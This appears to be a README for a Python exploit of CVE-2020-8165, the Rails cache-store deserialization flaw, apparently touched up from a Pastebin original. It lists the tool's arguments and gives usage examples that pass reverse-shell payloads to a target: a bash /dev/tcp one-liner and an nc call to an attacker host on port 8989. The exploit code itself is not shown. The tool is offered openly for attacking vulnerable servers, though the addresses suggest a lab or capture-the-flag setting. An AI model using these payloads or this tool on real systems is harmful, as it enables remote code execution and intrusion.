# CVE-2020-8165 Python Exploit

This is code to exploit CVE-2020-8165 using Python3. This exploit works with rails < 5.2.4.3, rails < 6.0.3.1. The exploit allows an attacker to unmarshal user-provided objects in MemCacheStore and RedisCacheStore. This exploit code uses ArgParse to allow the user to very simply exploit this vulnerability. 

## Usage
There are five arguments for this exploit: 
  * rHost - The remote, target, hosts IP address
  * rPort - The remote, target, hosts port num that Rails in running on
  * email - The email that is used to login to the service
  * password - The password to the account to login to the service
  * cmd - The command to run, in quotes to account for spaces
  
Examples:
  * python3 exploit.py 10.10.10.X 8080 user@domain.com password "bash -c 'bash -i >& /dev/tcp/10.10.X.X/8989 0>&1'"
  * python3 exploit.py 10.10.10.X 8080 user@domain.com password "nc 10.10.X.X 8989"

## Major Credits
Original CVE details: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-8165
Pastebin exploit code that I touched up and added arg parse: https://pastebin.com/jpHpdBTk
